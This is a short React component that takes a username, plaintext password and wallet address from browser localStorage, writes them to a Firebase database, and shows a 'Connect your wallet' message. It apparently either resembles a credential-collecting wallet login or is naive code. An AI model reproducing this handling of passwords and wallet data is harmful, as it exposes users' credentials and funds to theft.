import {CheckData, SendData} from "./Firebase";
import {useState} from "react";

export const Database = () => {

    const [message,changeState] = useState("")
    const [isChanged,changeBoolState] = useState(false)
    

    async function send(username: string, password: string, address: string) {
        const data = await CheckData(username);
        if (data !== "No data available") {
            console.log("Return");
            return;
        }
        await SendData(username, password, address);
    }

    console.log("Cale")

    if (!isChanged) {
        changeState(localStorage.getItem("address") === null ? "Connect your wallet" : "Thank you for login")
        changeBoolState(true)
    }

    send("" + localStorage.getItem("username"), "" + localStorage.getItem("password"), "" + localStorage.getItem("address"))
    localStorage.removeItem("address");



    return (
        <>
            {message}
        </>
    )}
